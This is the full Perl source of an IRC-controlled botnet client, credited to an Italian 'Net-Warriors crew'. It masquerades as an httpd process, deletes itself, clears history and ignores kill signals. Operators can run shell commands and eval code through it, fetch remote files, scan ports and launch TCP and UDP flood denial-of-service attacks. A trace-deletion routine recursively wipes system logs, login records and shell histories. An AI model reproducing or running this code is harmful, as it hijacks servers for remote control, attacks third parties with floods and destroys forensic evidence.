#!/usr/bin/perl
#lol
#Ednet  v 1.1 by LordOfDeath Net-Warriors crew   http://netwarriorscrew.altervista.org Catched from  flers <webmaster.staff@gmail.com> Greetz: Devil_Winged Gh1sm0
use IO::Select;
use IO::Socket::INET;

my $put='RxZ|'; #Davanti al nick
my $processo = 'httpd';
my $server = "irc.crewindonesia.biz.tm";     	#server 
my $port = 7000;                   #porta
my $ident = "DoS";           #ident
my $realname = "Need DDoS? Query me ;)";        #realname
my $chan = "#spread";               	#canale
my $pass = "ewOck";                	#password canale
my $siflers = $0;
my $password = "ewock";
my $boss = "brewOck";
my $sprelink="$ARGV[0]" if $ARGV[0]; #Con questo prendo il link dallo spread
my $sprepath="$ARGV[1]" if $ARGV[1];
connessione:
#PROVO AD ASSOCIARMI UN PROCESSO AUTOMATICAMENTE
@processo=`ps x | grep http`;
foreach $linea(@processo){
if(($linea=~ /\/(.+)$/) && ($linea!~/grep/i)){
$orics=$1;}
}
$orics="/$orics";
if (length($orics) <= 3){
$orics=$processo;
}
$0="$orics"."\0"x16;;
my $pid=fork;
exit if $pid;
chan("Problema com o fork: $!") unless defined($pid);
system("rm -f http.pl*");
system("history -c ");
my @array = ('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u','i', 'O', 'Y', 'T', 'Y', 'O', 'O', 'P', 'p', 'B', 'C', 'R', 'O', 'S', 'E', 'K', 'J', 'W', 'NS', 'j', 'k', 'v', 'w', 'x', 'z', '1', '2', '3', '4','5','6','7','8','9','0');
sub genpass () {
$adv = $array[rand(@array)] . $array[rand(@array)] . $array[rand(@array)] . $array[rand(@array)] . $array[rand(@array)] . $array[rand(@array)] . $array[rand(@array)];
return ($adv);
}
genpass();
my $nick = $put . $adv;
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
connecte($server,$port,$ident,$realname,$nick,$pass,$chan);
sub chan {
	$msg=shift;
	print $irc "PRIVMSG $chan :$msg\n";
}

sub query {
	($query, $msg)=@_;
	print $irc "PRIVMSG $query :$msg\n";
}
sub connecte{
$server=$_[0];
$port=$_[1];
$ident=$_[2];
$realname=$_[3];
$nick=$_[4];
$pass=$_[5];
$chan=$_[6];
$irc=IO::Socket::INET->new(
        PeerAddr=>$server,
        PeerPort=>$port,
        Proto=>'tcp',
		Timeout=> '10') or goto connessione;
                printf $irc "USER $ident $ident $ident $ident :$realname\n";
                printf $irc "NICK $nick\n";
                printf $irc "PRIVMSG nickserv/@/services.dal.net :identify $pass\n";
                printf $irc "join $chan $pass\n";
				printf $irc "VERSION mIRC v6.16 Net-Warriors Script";
                printf $irc "PRIVMSG $chan :$nick online\n";
		print "Bot Caricato Correttamente\n";
		return $irc;
}
 while(defined($in=<$irc>)){
printf $irc "join $chan $pass\n";
#if($in=~/^:(.+)\!.+ JOIN\b/){print $irc "PRIVMSG $1 :Ciao $1 Benvenuto su $chan\n";}
if($in=~/PING(.*)/){print $irc "PONG :$1\n";}

##Login##
if($in=~/^:(.+)\!.+ PRIVMSG (.+) :!login (.*)\b/){
$logger=$1;
$pass=$3;
if (($logger eq $boss)&&(crypt($pass,$password) eq $password)){
	 for ($[..$#logged) {
       splice(@logged, $_, 1) if $logged[$_] =~ /$logger/;
   } 
push (@logged,$logger);
chan("10»15iNfo10«7 $logger 15SoNo Il Tuo SeRvO");
} else {
chan("10»15iNfo10«7 $logger 15HaI TenTato Di Fottermi??? Tentato accesso loggato!");
}
}


if($in=~/^:(.+)\!.+ PRIVMSG (.+) :!logout\b/){
$op3=$1;
chan("10»15iNfo10«7 $op3 15 RiPeNeTRaMi AppeNa PuOi Gi? Mi MaNkI :* ");
	 for ($[..$#logged) {
       splice(@logged, $_, 1) if $logged[$_] =~ /$op3/;
   } 
}
##End Login##
foreach $owns (@logged){
next unless ($in=~/^:$owns\!.+ PRIVMSG (.+) :/);

&Dos;
&quit;
&scanner;
&shelluzza;
&ebva;
&get;
&joinpart;
&raw;
&name;
&say;
&trace;
}
}
goto connessione;
sub get{
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
if($in=~/!get (.*)/) {
$url=$1;
chop $url;
my $patha = "";my $file = "";($patha, $file) = $url =~ /^(.+)\/(.+)$/;
print $patha;
chan("[*] FILE :$file");
($otherdir,$host) = $patha =~ /^(.+)\/(.+)/;
chan("[*] Host: $host");
$scarica=IO::Socket::INET->new( 
		PeerAddr=>$host,
        PeerPort=>80,
        Proto=>'tcp',
		Timeout=> '10') or goto connessione;

print $scarica "GET /$file HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";

my $buff="";
while(<$scarica>) { $buff.=$_;}
($nouse, $poc) = split(/Content-Length:.*/,$buff);
($nouse, $data) = split(/Content-Type:.*/,$buff);
$data =~ s/^\n//g;
open FILE, ">$file";
print FILE "$data";
close FILE;
		
		chan("[*] File Downloaded Correctly");

close ($scarica);

}
}exit;}}
sub trace {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
if($in=~/!tracedelete(.+)/ ){
chan("TrAceDelEte");
logs();
}
exit;}}}
sub ebva {
if($in=~/!eval (.+)/ )
{
chan("Eval $1");
$evi=$1;
chomp $evi;
eval($evi);
}
if($in=~/!link/){
chan("My Link Is $sprelink my path is : $sprepath");
}
}


sub joinpart {
if($in=~/!join (.*)/) 
{print $irc "join $1";}
if($in=~/!part (.*)/)
{print $irc "part $1";}
}
sub raw {
if($in=~/!raw (.*)/)
{
$comando=$1;
chop $comando;
print $irc "$comando\n";
}
}
sub say {
if($in=~/!say (.*) (.*)/){
print $irc "PRIVMSG $1 $2\n";
}
}

sub name {
if($in=~/!nick (.*)/)
{
$comando1=$1;
chomp $comando1;
print $irc "nick :$comando1\n";
}
}

sub shelluzza{
if($in=~/^:(.+)\!.+ PRIVMSG (.+) :-(.+)/ ){
$printl=$chan;
$comando=$3;
chop $comando;
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || print $irc "PRIVMSG $printl: Directory Non Esistente!\n";
    return;
  } elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
		   sleep 1;
             $c++;
             chop $linha;
print $irc "PRIVMSG $printl :$linha\n";
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }

  }
if($in=~/^:(.+)\!.+ PRIVMSG (.+) :@(.+)/ ){
$printl=$1;
$comando=$3;
chop $comando;
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || print $irc "PRIVMSG $printl: Directory Non Esistente!\n";
    return;
  } elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
		   sleep 1;
             $c++;
             chop $linha;
print $irc "PRIVMSG $printl :$linha\n";
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }

  }
}

sub scanner{
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
if($in=~/!scan (.*) (.*) (.*)/){
$target = $1;
$port = $2;
$maxport = $3;
$daddr = inet_aton($target);
chan("\00210»15sCaNNeR10«\002 15sCaNNiNG - $target ports $port a $maxport");
foreach (; $port<=$maxport; $port++) {
chan("\00210»15sCaNNeR10«\002 15PoRta $port Aperta\r\n") if ( $socket = IO::Socket::INET->new(PeerAddr=>"$target:$port",Proto=>'tcp',Timeout=>1));
}
chan("\00210»15sCaNNeR10«\002 15sCaNNiNG Di $target 15FiNiTo\r\n");
close ($socket);
}
exit;}}
}
sub quit {
if($in=~/!quit/){
chan("\00210»15QuiT10«\002 4,12I 8LoVe 9You 7My 11LuCkY 13RoOt ");
}
if($in=~/!quit/){
print $irc "QUIT\n";
exit;
}

}




sub Dos {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
if ($in =~ /!tcpflood (.*) (.*) (.*)/) {
chan("\00210»15tCp-dDoS10«\002 Attacco ".$1.":".$2." PeR ".$3." SeCoNdi.\n ");
     my $itime = time;
     my ($cur_time);
             $cur_time = time - $itime;
     while ($3>$cur_time){
             $cur_time = time - $itime;
     &tcpflooder("$1","$2","$3");
             }
chan("\00210»15tCp-dDoS10«\002 Attacco FiNiTo ".$1.":".$2.".\n ");
}
if ($in =~ /!udpflood (.*) (.*) (.*)/) {
$tempo=$3;
chomp $tempo;
flooder("$1", "$2", "$tempo");
}
exit;}}
}

sub logs{
open FILE, ">", "e.pl";
print FILE q{ if( -e "/var/log/lastlog" )
      {
       system 'rm -rf /var/log/lastlog';

      }
     else
      {

      }
     if( -e "/var/log/wtmp" )
      {
       system 'rm -rf /var/log/wtmp';


      }
     else
      {

      }
    if( -e "/etc/wtmp" )
      {
       system 'rm -rf /etc/wtmp';

      }
    else
      {

      }
    if( -e "/var/run/utmp" )
      {
       system 'rm -rf /var/run/utmp';


      }
    else
      {

      }
    if( -e "/etc/utmp" )
      {
       system 'rm -rf /etc/utmp';


      }
    else
      {

      }
    if( -e "/var/log" )
      {
       system 'rm -rf /var/log';


      }
    else
      {

      }
       if( -e "/var/logs" )
      {
       system 'rm -rf /var/logs';



      }
    else
      {

      }
    if( -e "/var/adm" )
      {
       system 'rm -rf /var/adm';


      }
    else
      {

      }
    if( -e "/var/apache/log" )
      {
       system 'rm -rf /var/apache/log';


  
      }
   else
      {

      }
    if( -e "/var/apache/logs" )
      {
       system 'rm -rf /var/apache/logs';

      }
    else
      {
 
      }
    if( -e "/usr/local/apache/log" )
      {
       system 'rm -rf /usr/local/apache/log';


      }
    else
      {

      }
    if( -e "/usr/local/apache/logs" )
      {
       system 'rm -rf /usr/local/apache/logs';

      }
   else
      {

      }
    if( -e "/root/.bash_history" )
      {
       system 'rm -rf /root/.bash_history';

      }
    else
      {
      }
    if( -e "/root/.ksh_history" )
      {
       system 'rm -rf /root/.ksh_history';


      }
    else
      {

      }
	  
	   if( -e "/var/apache2/log" )
      {
       system 'rm -rf /var/apache/log';


      }
   else
      {

      }
    if( -e "/var/apache2/logs" )
      {
       system 'rm -rf /var/apache/logs';

      }
    else
      {
 
      }
    if( -e "/usr/local/apache2/log" )
      {
       system 'rm -rf /usr/local/apache/log';


      }
    else
      {

      }
    if( -e "/usr/local/apache2/logs" )
      {
       system 'rm -rf /usr/local/apache/logs';



      }
   else
      {

      }

  system 'find / -name *.bash_history -exec rm -rf {} \;';
  system 'find / -name *.bash_logout -exec rm -rf {} \;';
  system 'find / -name "log*" -exec rm -rf {} \;';
  system 'find / -name *.log -exec rm -rf {} \;';
  };
close FILE; 
$loggg="perl e.pl;rm -rf e.pl";
$oo=`$loggg`;
chan("\00210»15TraceDelete10«\002 CSI OuT Of WoRk ");
}

sub flooder {
while (){
use Socket;


my ($ip,$port,$size,$time);
 $ip=$_[0];
 $port=$_[1]; 
 $ftime=$_[2];
 
chan("\00210»15UdP-dDoS10«\002 Attacco $ip:$port PeR $ftime SeCoNdi.\n ");
  my $itime = time;
  my ($cur_time);
socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

if ($_[1] ==0 && $_[2] ==0) {
 goto randpackets;
}
if ($_[1] !=0 && $_[2] !=0) {

 goto packets;
}
if ($_[1] !=0 && $_[2] ==0) {
 goto packets;
}
if ($_[1] ==0 && $_[2] !=0) {

 goto randpackets;
}

packets:
while () {
if($in=~/PING(.*)/){print $irc "PONG :$1\n";}
 $size=$rand x $rand x $rand;
  $cur_time = time - $itime;
last if $cur_time >= $ftime;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));

} 

randpackets:
while () {
if($in=~/PING(.*)/){print $irc "PONG :$1\n";}
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
  $cur_time = time - $itime;
   last if $cur_time >= $ftime;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));

}

	 chan("\00210»15uDp-dDoS10«\002 DoSSaTo $ip PeR $ftime SeCoNdi.\n ");
	      last if $cur_time >= $ftime;
	 }
	 }
	 
sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}

sub sysinfo{
if($in=~/!sysinfo/){
$uptime=`uptime`;
$uname=`uname -a`;
$df=`df -h`;
$perm=`find /  -type d -perm -2 -ls`;
chan("[\002SySInFo\002]");
chan("$uname ----- $uptime");
chan("$df");
chan("$perm");
}
} 


